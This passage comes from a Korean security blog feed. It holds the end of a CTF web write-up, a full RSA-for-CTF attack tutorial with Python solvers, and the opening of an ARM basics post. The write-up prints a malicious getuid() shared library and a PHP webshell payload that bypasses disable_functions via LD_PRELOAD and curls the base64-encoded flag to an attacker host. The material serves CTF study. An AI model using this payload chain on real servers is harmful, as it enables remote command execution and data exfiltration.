class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">u_int <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command;</span><br><span class="line">command = getenv(<span class="string">"youngsin"</span>);</span><br><span class="line">system(command);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>php payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uploads/youngsin/webshell.php?0=putenv(&quot;LD_PRELOAD=/tmp/evil.so&quot;);putenv(&quot;youngsin=curl http://my_ip:9996/ -d id=`/readFlag|base64|tr -d &apos;\n&apos;`&quot;);mb_send_mail(&quot;a&quot;,&quot;a&quot;,&quot;a&quot;);</span><br></pre></td></tr></table></figure><p>해당 Payload를 실행하게되면 공격자 서버로 전송된 Flag를 획득할 수 있습니다.</p><p><strong><code>Flag = inctf{Ohh,you_are_the_ultimate_chainer,Bypassing_disable_function_wasn&#39;t_fun?:SpyD3r}</code></strong></p><h1 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h1><p><a href="https://www.php.net/manual/en/mbstring.installation.php" target="_blank" rel="noopener">https://www.php.net/manual/en/mbstring.installation.php</a><br><a href="https://www.php.net/manual/en/function.mb-send-mail.php" target="_blank" rel="noopener">https://www.php.net/manual/en/function.mb-send-mail.php</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA for CTF</title>
      <link href="/2019/09/24/Crypto/%E3%84%B4%20Research/RSA_for_CTF/"/>
      <url>/2019/09/24/Crypto/%E3%84%B4%20Research/RSA_for_CTF/</url>
      
        <content type="html"><![CDATA[<h3 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h3><ul><li>RSA Key Gen</li><li>RSA 암호화 및 복호화<ul><li>암호화</li><li>복호화</li></ul></li><li>RSA 문제 종류<ul><li>d값 계산</li><li>낮은 지수 공격</li><li>n값 소인수 분해 및 DB 이용</li><li>위너 공격</li><li>하스타드 공격</li><li>선택 암호문 공격</li><li>p, q값이 비슷할 경우 n 값으로 p, q값 구하기</li></ul></li><li>레퍼런스</li><li>문서 역사</li></ul><hr><h3 id="RSA-Key-Gen"><a href="#RSA-Key-Gen" class="headerlink" title="RSA Key Gen"></a>RSA Key Gen</h3><ol><li><p><strong>p, q 선택</strong></p><ul><li><p>python에선 다음과 같이 p, q를 생성할 수 있다.</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>) <span class="comment"># 1024bit</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>n 계산</strong></p><ul><li><strong>p와 q를 곱하면 n</strong>이 된다.</li></ul></li><li><p><strong>phi 계산</strong></p><ul><li><strong>(p-1)과 (q-1)을 곱하면 phi</strong>가 된다. </li></ul></li><li><p><strong>e 선택</strong></p><ul><li><strong>주로 65537</strong></li><li><strong>phi와 서로소</strong>인 수</li></ul></li><li><p><strong>d 계산</strong></p><ul><li><p>d = <script type="math/tex">e^{-1}</script> mod n</p><ul><li><strong>mod phi에 대한 e의 곱셈의 역원</strong></li></ul></li><li><p>python에서 d값을 계산하는 방법은 두가지이다.</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e, phi) <span class="comment"># gmpy2</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>) <span class="comment"># Crypto.Util.number</span></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = divm(<span class="number">1</span>, e, phi) <span class="comment"># gmpy2</span></span><br></pre></td></tr></table></figure></li><li><p><code>invert</code>는 곱셈의 역원을 구해주고 <code>divm</code>의 첫 번째 인자를 1로 지정해주면 역원을 구해주는 기능을 한다. (곱셈의 역원이란 곱했을 때 1이 나오는 수를 의미한다.)</p></li></ul></li></ul></li></ol><p>​    <strong>공개키(public key)  : <code>(e,n)</code></strong></p><p>​    <strong>개인키(private key): <code>(d,n)</code></strong></p><hr><h3 id="RSA-암호화-및-복호화"><a href="#RSA-암호화-및-복호화" class="headerlink" title="RSA 암호화 및 복호화"></a>RSA 암호화 및 복호화</h3><ul><li>암호화<ul><li>암호문 = <script type="math/tex">평문^e</script> mod n</li></ul></li><li>복호화<ul><li>평문 = <script type="math/tex">암호문^d</script> mod n</li></ul></li></ul><hr><h3 id="RSA-문제-종류"><a href="#RSA-문제-종류" class="headerlink" title="RSA 문제 종류"></a>RSA 문제 종류</h3><ul><li><p><strong>d값 계산</strong></p><ul><li><strong>p, q, e 값 등이 주어졌을 경우</strong> n값과 phi 값을 계산 가능하기 때문에 d 값을 계산하면 된다.</li><li><p>gmpy2의 <code>invert</code>또는 <code>divm</code>를 사용한다.</p><ul><li><strong>d = invert(e, phi)</strong></li><li><strong>d = divm(1, e, phi)</strong></li></ul></li><li><p>예시 코드 (문제에서 p, q, e, c가 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = invert(e, phi) <span class="comment"># d = divm(1, e, phi)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c, d, n)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p><strong>낮은 지수 공격</strong></p><ul><li><p><strong>e 값과 매우 작고 n 값이 큰 경우</strong> 가능한 공격 방법</p></li><li><p>보통 <code>e 값은 3</code>인데, <strong>암호문의 세제곱근을 구하면 평문</strong>이 된다.</p></li><li><p>gmpy2의 <code>iroot</code> 또는 <code>cbrt</code>를 사용한다.</p><ul><li><strong>m = iroot(c, 3)[0]</strong></li><li><strong>m = cbrt(c)</strong></li></ul></li><li><p>예시 코드 (문제에서 c, e값이 주어졌고 e 값이 3이라고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> local_context() <span class="keyword">as</span> ctx:</span><br><span class="line">    ctx.precision = <span class="number">3000</span></span><br><span class="line">    m = cbrt(c)</span><br><span class="line">    <span class="comment">#m = iroot(c, 3)[0]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%x'</span> % int(m)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li><li><p><code>cbrt</code>는 세제곱근을 구해주는 함수고 <code>iroot</code>의 두 번째 인자를 3으로 주면 세제곱근을 구해준다. 하지만 iroot의 반환 값은 튜플이고 원하는 값은 0번째 있는 값이다.</p></li><li><p><code>ctx.precision</code> 값은 <strong>정밀도</strong>에 관한 값인데 만약 <strong>결과 값이 재대로 나오지 않는다면 해당 값을 더 높게 수정해서 정밀도를 올려야 한다.</strong></p></li></ul></li></ul></li></ul><ul><li><p><strong>n값 소인수 분해 및 DB 이용</strong></p><ul><li><p><strong>작은 수의 n</strong>과 e만 주어졌을 경우 또는 <strong>DB에 존재하는 소수</strong>인 경우 가능한 공격 방법</p></li><li><p>d 값을 구하기 위해서 phi 값이 필요하고 phi를 구하기 위하여 p, q 값이 필요한데, <strong>n이 작다면 소인수 분해를 통해서 p, q값을 계산</strong> 가능하다.</p></li><li><p>매우 큰 소수라서 소인수 분해는 못하지만 DB에 존재하는 소수면 바로 p, q 값을 구할 수 있다.</p></li><li><p>주로 웹 사이트를 이용한다.</p><ul><li><p>[ <a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> ]</p></li><li><p>[ <a href="https://www.alpertron.com.ar/ECMC.HTM" target="_blank" rel="noopener">https://www.alpertron.com.ar/ECMC.HTM</a> ]</p></li></ul></li></ul></li></ul><ul><li><p><strong>위너 공격</strong></p><ul><li><p><strong>e 값이 매우 큰경우</strong> 가능한 공격 방법</p></li><li><p>e 값이 큰 경우 d 값이 작을 확률이 높고 이때 성립한다.</p></li><li><p>위너 공격을 해주는 소스 코드를 이용해서 d 값을 알아낼 수 있다.</p><ul><li><a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></li><li><code>git clone https://github.com/pablocelayes/rsa-wiener-attack.git</code> 명령으로 위너 공격 코드를 다운 받고 <code>RSAwienerHacker.py</code>를 조금 수정해서 사용한다.</li></ul></li><li><p>예시 코드 (n, e, c 값이 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># RSAwienerHacker.py</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    c = </span><br><span class="line">    d = hack_RSA(e, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c, d, n)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p><strong>하스타드 공격</strong></p><ul><li><p><strong>n값과 c 값이 3개씩 주어 지며 e 값이 작은 경우</strong>에 가능한 공격 방법</p></li><li><p>e 값은 주로 3이다.</p></li><li><p>하스타드 공격을 해주는 소스 코드를 이용해서 평문을 알아낼 수 있다.</p></li><li><p>예시 코드 (e, n1, n2, n3, c1, c2, c3이 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t        RSA Hastad Attack         "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t         JulesDT -- 2016          "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t         License GNU/GPL          "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span><span class="params">(n, a)</span>:</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a*b, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n_i, a_i <span class="keyword">in</span> zip(n, a):</span><br><span class="line">        p = prod / n_i</span><br><span class="line">        sum += a_i * mul_inv(p, n_i) * p</span><br><span class="line">    <span class="keyword">return</span> sum % prod</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_inv</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    b0 = b</span><br><span class="line">    x0, x1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a &gt; <span class="number">1</span>:</span><br><span class="line">        q = a / b</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">        x0, x1 = x1 - q * x0, x0</span><br><span class="line">    <span class="keyword">if</span> x1 &lt; <span class="number">0</span>: x1 += b0</span><br><span class="line">    <span class="keyword">return</span> x1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_invpow</span><span class="params">(x,n)</span>:</span></span><br><span class="line">    high = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> high ** n &lt; x:</span><br><span class="line">        high *= <span class="number">2</span></span><br><span class="line">    low = high/<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> low &lt; mid <span class="keyword">and</span> mid**n &lt; x:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">elif</span> high &gt; mid <span class="keyword">and</span> mid**n &gt; x:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseC</span><span class="params">(argv, index, verbose)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    file = open(argv[index],<span class="string">'r'</span>)</span><br><span class="line">    cmd = <span class="string">' '</span>.join(argv)</span><br><span class="line">    fileInput = <span class="string">''</span>.join(file.readlines()).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'--decimal'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as decimal input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(fileInput)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'--hex'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as hexadecimal input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(fileInput,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'--b64'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as base64 input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(binascii.hexlify(binascii.a2b_base64(fileInput)),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fileInput = long(fileInput)</span><br><span class="line">            <span class="keyword">if</span> verbose:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"## Guessed as decimal input"</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">return</span> long(fileInput)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">if</span> all(c <span class="keyword">in</span> string.hexdigits <span class="keyword">for</span> c <span class="keyword">in</span> fileInput):</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"## Guessed as hexadecimal input"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">return</span> long(fileInput,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"## Guessed as base64 input"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">return</span> long(binascii.hexlify(binascii.a2b_base64(fileInput)),<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseN</span><span class="params">(argv,index)</span>:</span></span><br><span class="line">    file = open(argv[index],<span class="string">'r'</span>)</span><br><span class="line">    fileInput = <span class="string">''</span>.join(file.readlines()).strip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fileInput = long(fileInput)</span><br><span class="line">        <span class="keyword">return</span> fileInput</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">        <span class="keyword">return</span> long(RSA.importKey(fileInput).__getattr__(<span class="string">'n'</span>))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = </span><br><span class="line"></span><br><span class="line">    n1 = </span><br><span class="line">    n2 = </span><br><span class="line">    n3 = </span><br><span class="line"></span><br><span class="line">    c1 = </span><br><span class="line">    c2 = </span><br><span class="line">    c3 = </span><br><span class="line"></span><br><span class="line">    n = [n1,n2,n3]</span><br><span class="line">    a = [c1,c2,c3]</span><br><span class="line"></span><br><span class="line">    result = (chinese_remainder(n, a))</span><br><span class="line">    resultHex = str(hex(find_invpow(result,<span class="number">3</span>)))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Decoded Hex :\n"</span>,resultHex</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"---------------------------"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"As Ascii :\n"</span>,resultHex.decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p><strong>선택 암호문 공격</strong></p><ul><li><p><strong>원하는 암호문을 복호화 해주는 경우</strong> 가능한 공격 방법(<strong>단, flag는 복호화해주지 않음</strong>)</p></li><li><p><strong>평문의 곱은 암호문의 곱과 동일</strong>하다는 성질을 이용한다.</p></li><li><p>풀이 방법 (flag를 암호화한 값이 주어지고 암호화, 복호화 기능이 존재한다고 가정)</p><ol><li><p><strong>숫자 2를 암호화</strong> 한다.</p></li><li><p><strong>숫자 2를 암호화한 값과 flag를 암호화한 값을 곱한다.</strong></p></li><li><p>결과 값을 <strong>숫자 2로 나누면 플래그</strong>가 된다.</p></li></ol></li></ul></li></ul><ul><li><p><strong>p, q값이 비슷할 경우 n 값으로 p, q값 구하기</strong></p><ul><li><p>gmpy2 모듈의 <code>next_prime</code> 함수를 이용할 경우 p, q 값이 거의 차이가 나지 않는다.</p></li><li><p>이때 n 값만 주어져도 p, q값을 구할 수 있게 된다.</p></li><li><p>gmpy2의 <code>isqrt</code>와 <code>t_divmod</code>를 이용하면 된다.</p></li><li><p>예시 코드 (n 값과 e 값이 주어졌다고 가정)</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n =</span><br><span class="line">e = </span><br><span class="line">c =</span><br><span class="line"></span><br><span class="line">p = isqrt(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q, r = t_divmod(n, p)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'%x'</span> % pow(c, d, n)).decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><hr><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><p><a href="https://blog.naver.com/yjw_sz/221441769257" target="_blank" rel="noopener">https://blog.naver.com/yjw_sz/221441769257</a></p><p><a href="https://blog.naver.com/yjw_sz/221396346574" target="_blank" rel="noopener">https://blog.naver.com/yjw_sz/221396346574</a></p><p><a href="https://xerxes-break.tistory.com/341" target="_blank" rel="noopener">https://xerxes-break.tistory.com/341</a></p><hr><h3 id="문서역사"><a href="#문서역사" class="headerlink" title="문서역사"></a>문서역사</h3><p><code>2019-09-24</code> <strong>JSec: 최초 작성</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> ㄴ Research </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARM_기초</title>
      <link href="/2019/09/20/Pwn/%E3%84%B4%20Research/ARM_%EA%B8%B0%EC%B4%88/"/>
      <url>/2019/09/20/Pwn/%E3%84%B4%20Research/ARM_%EA%B8%B0%EC%B4%88/</url>
      
        <content type="html"><![CDATA[<h1 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h1><ul><li>ARM (Advanced Risc Machine)</li><li>Thumb 모드 / ARM 모드<ul><li>ARM Instruction</li><li>Thumb Instruction</li></ul></li><li>ARM 레지스터</li><li>ARM Intruction</li><li>ARM Assembly<ul><li>Branch Instruction (분기 명령)</li><li>LDR and STR Instruction (단일 데이터 이동명령)</li><li>LDM and STM Instruction (여러개의 데이터 이동명령)</li></ul></li><li>콜링 컨벤션</li><li>레퍼런스</li><li>문서 역사</li></ul><hr><h3 id="ARM-Advanced-Risc-Machine"><a href="#ARM-Advanced-Risc-Machine" class="headerlink" title="ARM (Advanced Risc Machine)"></a>ARM (Advanced Risc Machine)</h3><p><code>RISC</code>를 사용하는 대표적인 언어중 하나이며 <code>임베디드 장비</code>에 많이 쓰인다.</p><ul><li><p><strong>RISC</strong> (Reduced Instruction Set Computer)</p><ul><li><p>CPU 명령어의 개수를 줄여서 CISC 방식보다 구조를 간단하게 한 것</p></li><li><p>32비트로 명령어의 크기가 동일하다. (고정길이 명령)</p></li><li>대표적으로 <code>arm</code>, <code>mips</code>에서 사용한다.</li></ul></li><li><p><strong>CISC</strong> (Complex Instruction Set Computer)</p><ul><li>명령어의 수가 많고 처리하는 시간이 길어서 대기 시간이 길다.</li><li>대표적으로 <code>x86</code>에서 사용한다.</li></ul></li></ul><p><hr></p><h3 id="Thumb-모드-ARM-모드"><a href="#Thumb-모드-ARM-모드" class="headerlink" title="Thumb 모드 / ARM 모드"></a>Thumb 모드 / ARM 모드</h3><p><strong>ARM에는 두가지의 명령어 체계가 존재</strong>한다. 명령어가 16bit인 것도 있고 